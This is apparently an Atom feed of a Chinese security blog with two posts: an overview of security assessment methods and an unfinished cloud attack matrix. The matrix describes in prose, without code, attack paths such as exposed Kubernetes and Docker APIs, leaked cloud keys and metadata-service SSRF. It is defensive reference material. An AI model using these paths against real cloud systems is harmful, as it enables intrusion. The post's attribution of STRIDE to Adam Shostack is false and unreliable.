<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://yinwc.github.io/atom.xml" rel="self"/>
  
  <link href="https://yinwc.github.io/"/>
  <updated>2025-05-20T15:45:13.495Z</updated>
  <id>https://yinwc.github.io/</id>
  
  <author>
    <name>V1ZkRA</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全评估方法论</title>
    <link href="https://yinwc.github.io/2024/02/10/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95%E8%AE%BA/"/>
    <id>https://yinwc.github.io/2024/02/10/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95%E8%AE%BA/</id>
    <published>2024-02-10T03:09:47.000Z</published>
    <updated>2025-05-20T15:45:13.495Z</updated>
    
    <content type="html"><![CDATA[<p>安全评估是保障信息系统、网络安全的重要环节，常见的安全评估方法可从技术、管理、流程等维度划分，以下是几类主流方法及特点：</p><h3 id="一、按技术维度分类"><a href="#一、按技术维度分类" class="headerlink" title="一、按技术维度分类"></a><strong>一、按技术维度分类</strong></h3><h4 id="1-漏洞扫描（Vulnerability-Scanning）"><a href="#1-漏洞扫描（Vulnerability-Scanning）" class="headerlink" title="1. 漏洞扫描（Vulnerability Scanning）"></a>1. <strong>漏洞扫描（Vulnerability Scanning）</strong></h4><ul><li><strong>方法</strong>：使用自动化工具（如 Nessus、OpenVAS）扫描系统、网络设备、应用程序的漏洞，生成风险报告。</li><li><strong>场景</strong>：定期检测基础设施（服务器、数据库、Web 服务等）的已知漏洞，提前发现安全弱点。</li><li><strong>优点</strong>：效率高、覆盖广，可快速定位技术层面的漏洞。</li><li><strong>缺点</strong>：依赖漏洞库更新，无法检测未知漏洞或复杂业务逻辑缺陷。</li></ul><h4 id="2-渗透测试（Penetration-Testing）"><a href="#2-渗透测试（Penetration-Testing）" class="headerlink" title="2. 渗透测试（Penetration Testing）"></a>2. <strong>渗透测试（Penetration Testing）</strong></h4><ul><li><strong>方法</strong>：模拟黑客攻击手法，手动或工具辅助测试系统安全性，包括黑盒测试、白盒测试、灰盒测试。</li><li><strong>场景</strong>：验证漏洞扫描未发现的深层风险（如业务逻辑漏洞、权限绕过等），常用于关键系统上线前或等保合规。</li><li><strong>优点</strong>：贴近真实攻击场景，能发现高风险漏洞并验证修复效果。</li><li><strong>缺点</strong>：成本较高、耗时长，需专业人员执行，可能对系统造成干扰。</li></ul><h4 id="3-代码审计（Code-Review）"><a href="#3-代码审计（Code-Review）" class="headerlink" title="3. 代码审计（Code Review）"></a>3. <strong>代码审计（Code Review）</strong></h4><ul><li><strong>方法</strong>：人工或静态代码分析工具（如 SonarQube、Checkmarx）检查源代码，发现编码缺陷（如 SQL 注入、缓冲区溢出等）。</li><li><strong>场景</strong>：软件开发阶段（SDL）的安全左移，从源头减少安全漏洞。</li><li><strong>优点</strong>：精准定位代码层面的安全问题，指导开发修复。</li><li><strong>缺点</strong>：依赖审计人员经验，对复杂系统的全量代码审计成本高。</li></ul><h4 id="4-配置核查（Configuration-Audit）"><a href="#4-配置核查（Configuration-Audit）" class="headerlink" title="4. 配置核查（Configuration Audit）"></a>4. <strong>配置核查（Configuration Audit）</strong></h4><ul><li><strong>方法</strong>：依据安全基线（如 CIS 基准）检查系统、设备的配置合规性（如账户权限、日志审计、加密策略等）。</li><li><strong>场景</strong>：服务器、网络设备、云平台的初始部署或定期安全巡检。</li><li><strong>优点</strong>：标准化程度高，可快速发现配置层面的安全隐患。</li><li><strong>缺点</strong>：需持续更新基线标准，难以覆盖动态业务场景。</li></ul><h3 id="二、按管理维度分类"><a href="#二、按管理维度分类" class="headerlink" title="二、按管理维度分类"></a><strong>二、按管理维度分类</strong></h3><h4 id="1-风险评估（Risk-Assessment）"><a href="#1-风险评估（Risk-Assessment）" class="headerlink" title="1. 风险评估（Risk Assessment）"></a>1. <strong>风险评估（Risk Assessment）</strong></h4><ul><li><strong>方法</strong>：通过资产识别、威胁分析、脆弱性评估，计算风险等级（如 ISO 27005、NIST SP 800-30 框架），制定风险处置策略（规避、转移、缓解、接受）。</li><li><strong>场景</strong>：企业整体安全规划、合规认证（如等保、ISO 27001）前的全面安全诊断。</li><li><strong>优点</strong>：从业务视角量化风险，为管理层决策提供依据。</li><li><strong>缺点</strong>：需跨部门协作，流程较复杂，依赖数据准确性。</li></ul><h4 id="2-合规性评估（Compliance-Assessment）"><a href="#2-合规性评估（Compliance-Assessment）" class="headerlink" title="2. 合规性评估（Compliance Assessment）"></a>2. <strong>合规性评估（Compliance Assessment）</strong></h4><ul><li><strong>方法</strong>：对照行业标准或法规（如等保 3.0、GDPR、HIPAA），检查安全管理体系、技术措施的合规性。</li><li><strong>场景</strong>：政府、金融、医疗等对合规性要求高的行业，或企业申请认证前的自查。</li><li><strong>优点</strong>：明确合规差距，帮助企业满足监管要求。</li><li><strong>缺点</strong>：可能与实际风险防控存在脱节，需结合技术评估。</li></ul><h4 id="3-安全审计（Security-Audit）"><a href="#3-安全审计（Security-Audit）" class="headerlink" title="3. 安全审计（Security Audit）"></a>3. <strong>安全审计（Security Audit）</strong></h4><ul><li><strong>方法</strong>：通过文档审查、访谈、现场检查，评估安全策略、流程的执行情况（如日志审计、访问控制审计）。</li><li><strong>场景</strong>：内部安全管理体系的有效性验证，或第三方审计机构的合规检查。</li><li><strong>优点</strong>：确保安全制度落地，发现管理流程中的漏洞。</li><li><strong>缺点</strong>：主观性较强，需结合技术手段验证。</li></ul><h3 id="三、按流程维度分类"><a href="#三、按流程维度分类" class="headerlink" title="三、按流程维度分类"></a><strong>三、按流程维度分类</strong></h3><h4 id="1-基线评估（Baseline-Assessment）"><a href="#1-基线评估（Baseline-Assessment）" class="headerlink" title="1. 基线评估（Baseline Assessment）"></a>1. <strong>基线评估（Baseline Assessment）</strong></h4><ul><li><strong>方法</strong>：基于行业最佳实践或标准（如等保基本要求），快速扫描系统是否满足基础安全要求。</li><li><strong>场景</strong>：中小企业的基础安全建设、新系统上线前的准入检查。</li><li><strong>优点</strong>：轻量化、标准化，快速建立安全防护基线。</li><li><strong>缺点</strong>：无法满足个性化安全需求，深度不足。</li></ul><h4 id="2-深度评估（In-depth-Assessment）"><a href="#2-深度评估（In-depth-Assessment）" class="headerlink" title="2. 深度评估（In-depth Assessment）"></a>2. <strong>深度评估（In-depth Assessment）</strong></h4><ul><li><strong>方法</strong>：结合技术测试、管理审计、攻防演练（如红蓝对抗），全面分析系统安全防护能力。</li><li><strong>场景</strong>：大型企业、关键信息基础设施（如电力、运营商）的年度安全评估，或重大活动前的保障。</li><li><strong>优点</strong>：覆盖全维度风险，验证防护体系的实战能力。</li><li><strong>缺点</strong>：周期长、成本高，需多团队协同。</li></ul><h3 id="四、其他评估方法"><a href="#四、其他评估方法" class="headerlink" title="四、其他评估方法"></a><strong>四、其他评估方法</strong></h3><h4 id="1-威胁建模（Threat-Modeling）"><a href="#1-威胁建模（Threat-Modeling）" class="headerlink" title="1. 威胁建模（Threat Modeling）"></a>1. <strong>威胁建模（Threat Modeling）</strong></h4><ul><li><strong>方法</strong>：通过 STRIDE 模型（Spoofing、Tampering、Repudiation、Information Disclosure、Denial of Service、Elevation of Privilege）识别系统面临的威胁，制定防御措施。</li><li><strong>场景</strong>：软件开发或架构设计阶段，提前规划安全防护策略。</li></ul><h4 id="2-红蓝对抗演练（Red-vs-Blue-Team-Exercise）"><a href="#2-红蓝对抗演练（Red-vs-Blue-Team-Exercise）" class="headerlink" title="2. 红蓝对抗演练（Red vs. Blue Team Exercise）"></a>2. <strong>红蓝对抗演练（Red vs. Blue Team Exercise）</strong></h4><ul><li><strong>方法</strong>：红队模拟攻击方，蓝队负责防守，通过实战对抗检验应急响应能力和防护体系有效性。</li><li><strong>场景</strong>：高风险行业的年度实战化演练，提升团队协同防御能力。</li></ul><h3 id="选择建议"><a href="#选择建议" class="headerlink" title="选择建议"></a><strong>选择建议</strong></h3><ul><li><strong>小型企业 &#x2F; 基础场景</strong>：优先采用<strong>漏洞扫描 + 基线评估 + 合规性检查</strong>，快速满足基本安全需求。</li><li><strong>中大型企业 &#x2F; 复杂系统</strong>：组合使用<strong>风险评估 + 渗透测试 + 代码审计 + 红蓝对抗</strong>，构建全生命周期安全防护。</li><li><strong>开发团队</strong>：嵌入<strong>威胁建模 + 代码审计 + 动态安全测试（DAST）</strong>，实现安全左移（Shift Left）。</li></ul><p>实际应用中，通常需要结合多种方法，形成 “技术检测 + 管理审计 + 实战验证” 的立体化评估体系，确保安全风险的全面覆盖和有效管控。</p><h3 id="一些术语总结"><a href="#一些术语总结" class="headerlink" title="一些术语总结"></a>一些术语总结</h3><h4 id="CIS-安全基线"><a href="#CIS-安全基线" class="headerlink" title="CIS 安全基线"></a>CIS 安全基线</h4><ul><li><p><strong>CIS 安全基线（CIS Security Benchmarks）</strong> 是由 <strong>互联网安全中心（Center for Internet Security, CIS）</strong> 开发的一套标准化安全配置指南，旨在为操作系统、网络设备、云服务、应用软件等 IT 资产提供 <strong>最低安全要求和最佳实践</strong>，帮助组织降低安全风险、提升整体安全防护水平。</p><h5 id="核心目标："><a href="#核心目标：" class="headerlink" title="核心目标："></a>核心目标：</h5><ol><li><strong>标准化安全配置</strong>：提供统一、经过验证的安全配置标准，避免因配置差异导致的安全漏洞。</li><li><strong>降低攻击面</strong>：通过禁用不必要的服务、强化访问控制、更新补丁等措施，减少被攻击的可能性。</li><li><strong>合规性支持</strong>：帮助组织满足国内外数据安全法规（如 GDPR、等保 2.0、ISO 27001 等）的要求。</li><li><strong>简化安全管理</strong>：为安全团队提供清晰的操作指南，降低配置复杂性和人为错误。</li></ol></li></ul><h4 id="STRIDE-模型"><a href="#STRIDE-模型" class="headerlink" title="STRIDE 模型"></a>STRIDE 模型</h4><p><strong>STRIDE 模型</strong>是一种用于**威胁建模（Threat Modeling）**的经典框架，由微软工程师**Adam Shostack**在 20 世纪 90 年代提出。它通过将安全威胁分类为六大核心类型，帮助开发人员、安全团队系统化地识别、分析和优先处理系统中的潜在风险，从而在设计阶段提前预防安全漏洞。</p><h5 id="STRIDE-的六个威胁类别"><a href="#STRIDE-的六个威胁类别" class="headerlink" title="STRIDE 的六个威胁类别"></a>STRIDE 的六个威胁类别</h5><p>STRIDE 是六个英文单词的首字母缩写，每个字母代表一种威胁类型，具体含义如下：</p><table><thead><tr><th><strong>字母</strong></th><th><strong>威胁类型</strong></th><th><strong>定义</strong></th><th><strong>典型场景</strong></th></tr></thead><tbody><tr><td><strong>S</strong></td><td>Spoofing（伪装）</td><td>冒充其他用户、系统或服务的身份</td><td>攻击者通过窃取用户凭证，伪装成合法用户登录系统；伪造 IP 地址访问受限资源。</td></tr><tr><td><strong>T</strong></td><td>Tampering（篡改）</td><td>未经授权修改数据或系统配置</td><td>黑客篡改数据库中的交易记录；中间人攻击（MITM）修改传输中的报文内容。</td></tr><tr><td><strong>R</strong></td><td>Repudiation（抵赖）</td><td>用户或系统否认已发生的操作，且缺乏审计证据</td><td>攻击者执行恶意操作后否认行为，系统因未记录日志而无法追责；用户拒认交易记录。</td></tr><tr><td><strong>I</strong></td><td>Information Disclosure（信息泄露）</td><td>敏感数据被未授权访问或泄露</td><td>系统漏洞导致用户隐私数据（如身份证、密码）泄露；配置错误使内部文档公开可访问。</td></tr><tr><td><strong>D</strong></td><td>Denial of Service（拒绝服务）</td><td>故意耗尽系统资源，导致服务不可用</td><td>通过分布式拒绝服务攻击（DDoS）瘫痪服务器；利用漏洞使程序崩溃，中断业务流程。</td></tr><tr><td><strong>E</strong></td><td>Elevation of Privilege（权限提升）</td><td>低权限用户非法获取高权限，突破访问控制机制</td><td>通过缓冲区溢出漏洞获取系统管理员权限；利用弱密码策略从普通账户升级为特权账户。</td></tr></tbody></table><h4 id="ISO-27005"><a href="#ISO-27005" class="headerlink" title="ISO 27005"></a>ISO 27005</h4><ul><li><p>ISO&#x2F;IEC 27005 是国际标准化组织（ISO）和国际电工委员会（IEC）共同发布的信息安全管理标准，最新版本是 ISO&#x2F;IEC 27005:2022，全称为《信息安全、网络安全和隐私保护 有关管理信息安全风险的指南》</p></li><li><p>ISO&#x2F;IEC 27005 强调风险管理是一个持续的过程，组织需根据内外部环境的变化不断调整和改进风险管理措施，从而提高整体信息安全水平</p></li></ul><h4 id="NIST-SP-800-30-框架"><a href="#NIST-SP-800-30-框架" class="headerlink" title="NIST SP 800-30 框架"></a>NIST SP 800-30 框架</h4><ul><li><strong>NIST SP 800-30 框架</strong>是美国国家标准与技术研究院（NIST）发布的关于<strong>信息安全风险管理</strong>的重要指南，全称为《信息技术系统风险管理指南》（<em>Guide for Conducting Risk Assessments</em>）。该框架为组织提供了一套系统化、规范化的风险评估流程，旨在帮助识别、分析和处理信息系统及相关资产面临的风险，确保信息安全和业务连续性。</li></ul><h4 id="GDPR"><a href="#GDPR" class="headerlink" title="GDPR"></a>GDPR</h4><ul><li><strong>GDPR</strong> 是 <strong>《通用数据保护条例》（General Data Protection Regulation）</strong> 的英文缩写，是欧盟（EU）于 2018 年 5 月 25 日正式实施的一项具有里程碑意义的数据保护法规。它旨在统一欧盟境内的数据隐私保护标准，强化个人数据权利，并对企业处理个人数据的行为进行严格规范。</li></ul><h3 id="HIPAA"><a href="#HIPAA" class="headerlink" title="HIPAA"></a>HIPAA</h3><ul><li><strong>HIPAA</strong> 是 <strong>《健康保险流通与责任法案》（Health Insurance Portability and Accountability Act）</strong> 的英文缩写，是美国于 1996 年颁布的一项联邦法律，旨在规范医疗健康领域的<strong>数据隐私保护</strong>、<strong>安全标准</strong>及<strong>医疗保健系统效率</strong>。其核心目标是确保个人医疗信息的保密性和安全性，同时简化医疗管理流程，促进医疗保险的可移植性。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;安全评估是保障信息系统、网络安全的重要环节，常见的安全评估方法可从技术、管理、流程等维度划分，以下是几类主流方法及特点：&lt;/p&gt;
&lt;h3 id=&quot;一、按技术维度分类&quot;&gt;&lt;a href=&quot;#一、按技术维度分类&quot; class=&quot;headerlink&quot; title=&quot;一、按技术维</summary>
      
    
    
    
    
    <category term="安全评估" scheme="https://yinwc.github.io/tags/%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"/>
    
  </entry>
  
  <entry>
    <title>云安全</title>
    <link href="https://yinwc.github.io/2023/06/19/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    <id>https://yinwc.github.io/2023/06/19/%E4%BA%91%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-19T03:15:28.000Z</published>
    <updated>2023-07-03T02:17:13.304Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B">整体流程</a></li><li><a href="#%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE">初始访问</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li><li><a href="#%E5%AE%B9%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">容器攻击方式</a></li><li><a href="#cos%E5%AD%98%E5%82%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">cos存储攻击方式</a></li><li><a href="#serverless%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">Serverless攻击方式</a></li><li><a href="#%E5%85%B1%E5%90%8C%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">共同攻击方式</a></li></ul></li><li><a href="#%E6%89%A7%E8%A1%8C">执行</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li></ul></li><li><a href="#%E6%8C%81%E4%B9%85%E5%8C%96">持久化</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li></ul></li><li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li></ul></li><li><a href="#%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87">防御绕过</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li></ul></li><li><a href="#%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE">窃取凭据</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li></ul></li><li><a href="#%E6%8E%A2%E6%B5%8B">探测</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li></ul></li><li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8">横向移动</a><ul><li><a href="#%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">云服务器攻击方式</a></li></ul></li><li><a href="#%E5%BD%B1%E5%93%8D">影响</a></li></ul><!-- /TOC --><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p>初始访问、执行、持久化、权限提升、防御绕过、窃取凭据、探测、横向移动、影响</p><h2 id="初始访问"><a href="#初始访问" class="headerlink" title="初始访问"></a>初始访问</h2><h3 id="云服务器攻击方式"><a href="#云服务器攻击方式" class="headerlink" title="云服务器攻击方式"></a>云服务器攻击方式</h3><ol><li><p><strong>实例登录信息泄露</strong></p><p>​在购买并创建云服务器后，用户可以自行配置云服务器的登录用户名以及登录密码，Linux云服务器往往支持用户通过ssh的方式使用配置的用户名密码或SSH密钥的方式远程登录云服务器；在Windows服务器中，用户可以通过RDP文件或是远程桌面的形式登录云服务器。当上述这些云服务器实例登录信息被窃取后，攻击者可以通过这些信息非法登录云服务器实例。</p></li><li><p><strong>账户劫持</strong></p><p>​当云厂商提供的控制台存在漏洞时，用户的账户存在一定的劫持风险。以AWS 控制台更改历史记录功能模块处XSS漏洞以及AWS 控制台实例tag处XSS为例，攻击者可以通过这些XSS漏洞完成账户劫持攻击，从而获取云服务器实例的控制权。</p></li><li><p><strong>网络钓鱼</strong></p><p>​       为了获取云服务器的访问权限，攻击者可采用网络钓鱼技术手段完成此阶段攻击。攻击者通过向云服务器管理人员以及运维人员发送特定主题的钓鱼邮件、或是伪装身份与管理人员以及运维人员通过聊天工具进行交流，通过窃取凭据、登录信息或是安插后门的形式获取云服务器控制权。</p></li><li><p><strong>应用程序漏洞</strong></p><p>​        当云服务器实例中运行的应用程序存在漏洞、或是由于配置不当导致这些应用可以被非法访问时，攻击者可以通过扫描探测的方式发现并利用这些应用程序漏洞进行攻击，从而获取云服务器实例的访问权限。</p></li><li><p><strong>使用恶意或存在漏洞的自定义镜像</strong></p><p>​       云平台为用户提供公共镜像、自定义镜像等镜像服务以供用户快速创建和此镜像相同配置的云服务器实例。这里的镜像虽然与Docker镜像不同，其底层使用的是云硬盘快照服务，但云服务器镜像与 Docker镜像一样存在着类似的风险，即恶意镜像以及存在漏洞的镜像风险。当用户使用其他用户共享的镜像创建云服务器实例时，云平台无法保证这个共享镜像的完整性或安全性。攻击者可以通过这个方式，制作恶意自定义镜像并通过共享的方式进行供应链攻击。</p></li></ol><h3 id="容器攻击方式"><a href="#容器攻击方式" class="headerlink" title="容器攻击方式"></a>容器攻击方式</h3><ol><li><p><strong>应用程序漏洞</strong></p><p>​        当容器中运行的应用程序存在漏洞，或是由于配置不当导致这些应用可以被非法访问时，攻击者可以通过扫描探测等方式发现并进行利用，从而获取容器的访问权限。</p></li><li><p><strong>使用恶意或存在漏洞的自定义镜像</strong></p><p>​       攻击者构造恶意或存在漏洞的镜像，上传至镜像仓库。在目标服务器主动或被动形式下载恶意镜像并运行时，攻击者通过恶意容器进行初始访问。</p></li><li><p><strong>暴露 Kubernetes 控制面板</strong></p><p>​        当用户开启enable-skip-login配置且错误的授权Kubernetes-dashboard过高权限后，攻击者可以直接访问Kubernetes 控制面板并以此控制集群。</p></li><li><p><strong>Kubeconfig文件泄露</strong></p><p>​       在一些攻击场景中，由于开发者不安全的开发以及配置，或者一些针对设备的入侵事件，导致Kubeconfig文件泄露，攻击者可以通过窃取到的Kubeconfig配置kubectl并访问集群。</p></li><li><p><strong>Docker Engine API公网暴露</strong></p><p>​       Docker Engine API是Docker提供的用于Docker客户端与Docker守护进程交互的API，如果配置开启 Tcp Socket，则会存在未一定的风险风险。攻击者可以利用公网暴露的Docker Engine API在远程主机上创建一个特权容器并挂载主机根目录进行后续攻击流程。</p></li><li><p><strong>Kube Apiserver insecure-port开启</strong></p><p>​        非安全端口提供HTTP服务且无需身份认证，默认开放在8080端口。此端口上开放的服务应该是用于测试，如果其在生产环境中被暴露出来，可以控制多数K8s总控组件，并获取多数容器交互式Shell。</p></li><li><p><strong>Kube Apiserver secure-port开启匿名访问</strong></p><p>​       安全端口提供HTTPS服务且支持身份认证，默认开放在6443端口。错误配置将会导致匿名访问。攻击者可以匿名访问Kube API Server，并在Pod中执行命令。</p></li><li><p><strong>Kubelet API 匿名访问</strong></p><p>​        Kubelet用于在Node上管理本机Pod，如果kubelet存在匿名访问漏洞，攻击者可以通过Kubelet API 10250端口在Node中任意容器里执行命令。</p></li><li><p><strong>Etcd 2379端口公网暴露</strong></p><p>​         Kubernetes使用Etcd v3存储数据，默认监听2379端口，如果Etcd 2379暴露到公网且存在未授权访问漏洞，将导致敏感信息泄露，攻击者可以通过收集到的凭据接管集群。</p></li><li><p><strong>Kubectl proxy公网访问</strong></p><p>​        Kubectl proxy命令以反向代理的模式运行 Kubectl，建立代理后用户可以使用 curl、wget 或浏览器访问Kube Apiserver 。Kubectl proxy公网访问，其危害与利用方式与Kube Apiserver一致。</p></li></ol><h3 id="cos存储攻击方式"><a href="#cos存储攻击方式" class="headerlink" title="cos存储攻击方式"></a>cos存储攻击方式</h3><ol><li><p><strong>对象存储SDK泄露</strong></p><p>​        云平台所提供的对象存储服务，除了拥有多种 API 接口外，还提供了丰富多样的SDK供开发者使用。在SDK初始化阶段，开发者需要在SDK中配置存储桶名称、路径、地域等基本信息，并且需要配置云平台的永久密钥或临时密钥，这些信息将会被编写在SDK代码中以供应用程序操作存储桶。但是，如果这些承载着密钥的代码片段不慎泄露，比如开发者误将源码上传至公开仓库或者应用开发商在为客户提供的演示示例中未对自身SDK中凭据信息进行删除，这些场景将会导致对象存储凭据泄露，进而导致对象存储服务遭受入侵，攻击者通过冒用凭据所有者身份攻击对象存储服务。</p></li><li><p><strong>存储桶工具配置文件泄露</strong></p><p>​       在对象存储服务使用过程中，为了方便用户操作存储桶，官方以及开源社区提供了大量的对象存储客户端工具以供用户使用，在使用这些工具时，首先需要在工具的配置文件或配置项中填写存储服务相关信息以及用户凭据，以便工具与存储服务之间的交互。在某些攻击场景下，例如开发者个人PC遭受钓鱼攻击、开发者对象存储客户端工具配置文件泄露等，这些编写在存储服务工具配置文件中的凭据以及存储桶信息将会被泄露出来，攻击者可以通过分析这些配置文件，从中获取凭据，而在这些工具中配置的，往往又是用户的云平台主API密钥，攻击者通过这些信息可以控制对象存储服务，在一些严重的场景，攻击者甚至可以控制用户的所有云上资产。</p></li><li><p><strong>前端直传功能获取凭据</strong></p><p>​       在一些对象存储服务与Web开发以及移动开发相结合的场景中，开发者选择使用前端直传功能来操作对象存储服务，前端直传功能指的是利用iOS&#x2F;Android&#x2F;JavaScript等SDK通过前端直接向访问对象存储服务。前端直传功能，可以很好的节约后端服务器的带宽与负载，但为了实现此功能，需要开发者将凭据编写在前端代码中，虽然凭据存放于前端代码中，可以被攻击者轻易获取，但这并不代表此功能不安全，在使用此功能时，只要遵守安全的开发规范，则可以保证对象存储服务的安全：正确的做法是使用临时密钥而非永久密钥作为前端凭据，并且在生成临时密钥时按照最小权限原则进行配置。但是实际应用中，如果开发人员并未遵循安全开发原则，例如错误的使用了永久密钥，或为临时凭据配置了错误的权限，这将导致攻击者可以通过前端获取的凭据访问对象存储服务。攻击者通过分析前端代码，或者通过抓取流量的方式，获得这些错误配置生成的凭据，并以此发起攻击。</p></li></ol><h3 id="Serverless攻击方式"><a href="#Serverless攻击方式" class="headerlink" title="Serverless攻击方式"></a>Serverless攻击方式</h3><ol><li><p><strong>serverless service爆破</strong></p><p>​       若serverless service仅使用简单的英文字母或单词作为命名，则攻击者可以通过字典枚举爆破serverless service服务名称来找到潜在目标。</p></li><li><p><strong>serverless.yml泄漏</strong></p><p>​       通过信息泄漏查找潜在的serverless service，如通过GitHub搜索serverless.yml关键字来发现潜在serverless目标。</p></li><li><p><strong>应用程序漏洞</strong></p><p>​        利用应用程序本身存在的安全漏洞攻击serverless service，若应用程序未对外部传入的参数进行严格过滤则可能导致注入风险。</p></li><li><p><strong>组件漏洞&#x2F;使用易受攻击的库</strong></p><p>​        当选择编程语言开发功能时，必须保证导入的库以及代码本身是安全的。使用含有已知漏洞的组件是web应用程序10大威胁之一。若应用程序使用了存在漏洞的第三方组件，则serverless服务也将会受到漏洞威胁。</p></li></ol><h3 id="共同攻击方式"><a href="#共同攻击方式" class="headerlink" title="共同攻击方式"></a>共同攻击方式</h3><ol><li><p><strong>实例元数据服务未授权访问</strong></p><p>​        云服务器实例元数据服务是一种提供查询运行中的实例内元数据的服务，云服务器实例元数据服务运行在链路本地地址上，当实例向元数据服务发起请求时，该请求不会通过网络传输，但是如果云服务器上的应用存在RCE、SSRF等漏洞时，攻击者可以通过漏洞访问实例元数据服务。通过云服务器实例元数据服务查询，攻击者除了可以获取云服务器实例的一些属性之外，更重要的是可以获取与实例绑定的拥有操作云服务的角色，并通过此角色获取云服务的控制权。</p></li><li><p><strong>云平台账号非法登录</strong></p><p>​        云平台提供多种身份验证机制以供用户登录，包括手机验证、账号密码验证、邮箱验证等。在云平台登录环节，攻击者通过多种手法进行攻击以获取用户的登录权限，并冒用用户身份非法登录，具体的技术包括使用弱口令、使用用户泄露账号数据、骗取用户登录手机验证码、盗取用户登录账号等。攻击者使用获取到的账号信息进行非法登录云平台后，即可操作云服务。</p></li><li><p><strong>云平台主API密钥泄露</strong></p><p>​        云平台主API 密钥重要性等同于用户的登录密码，其代表了账号所有者的身份以及对应的权限。API 密钥由SecretId和SecretKey组成，用户可以通过API密钥来访问云平台API进而管理账号下的资源。在一些攻击场景中，由于开发者不安全的开发以及配置，或者一些针对设备的入侵事件，导致云平台主API 密钥泄露，攻击者可以通过窃取到的云平台主API 密钥，冒用账号所有者的身份入侵云平台，非法操作云服务。</p></li></ol><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><h3 id="云服务器攻击方式-1"><a href="#云服务器攻击方式-1" class="headerlink" title="云服务器攻击方式"></a>云服务器攻击方式</h3><ol><li><p><strong>通过控制台登录实例执行</strong></p><p>​攻击者在初始访问阶段获取到平台登录凭据后，可以利用平台凭据登录云平台，并直接使用云平台提供的Web控制台登录云服务器实例，在成功登录实例后，攻击者可以在实例内部执行命令。</p></li><li><p><strong>写入userdata执行命令</strong></p><p>​        Userdata是云服务器为用户提供的一项自定义数据服务，在创建云服务器时，用户可以通过指定自定义数据，进行配置实例。当云服务器启动时，自定义数据将以文本的方式传递到云服务器中，并执行该文本。通过这一功能，攻击者可以修改实例userdata并向其中写入待执行的命令，这些代码将会在实例每次启动时自动执行。攻击者可以通过重启云服务器实例的方式，加载userdata中命令并执行。</p></li><li><p><strong>利用后门文件执行指令</strong></p><p>​        攻击者在云服务器实例中部署后门文件的方式有多种，例如通过Web应用漏洞向云服务器实例上传后门文件、或是通过供应链攻击的方式诱使目标使用存在后门的恶意镜像，当后门文件部署成功后，攻击者可以利用这些后门文件在云服务器实例上执行命令。</p></li><li><p><strong>利用应用程序执行</strong></p><p>​        云服务器实例上部署的应用程序，可能会直接或者间接的提供命令执行功能，例如一些服务器管理类应用程序将直接提供在云服务器上执行命令的功能，而另一些应用，例如数据库服务，可以利用一些组件进行命令执行。当这些程序存在配置错误时，攻击者可以直接利用这些应用程序在云服务器实例上执行命令。</p></li><li><p><strong>利用SSH服务进入实例执行</strong></p><p>​        云服务器Linux实例上往往运行着SSH服务，当攻击者在初始访问阶段成功获取到有效的登录凭据后，即可通过SSH登录云服务器实例并进行命令执行。</p></li><li><p><strong>利用远程代码执行漏洞执行</strong></p><p>​        当云服务器上部署的应用程序存在远程代码执行漏洞时，攻击者将利用此脆弱的应用程序并通过编写相应的EXP来进行远程命令执行。</p></li></ol><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><h3 id="云服务器攻击方式-2"><a href="#云服务器攻击方式-2" class="headerlink" title="云服务器攻击方式"></a>云服务器攻击方式</h3><p>1. </p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="云服务器攻击方式-3"><a href="#云服务器攻击方式-3" class="headerlink" title="云服务器攻击方式"></a>云服务器攻击方式</h3><p>1. </p><h2 id="防御绕过"><a href="#防御绕过" class="headerlink" title="防御绕过"></a>防御绕过</h2><h3 id="云服务器攻击方式-4"><a href="#云服务器攻击方式-4" class="headerlink" 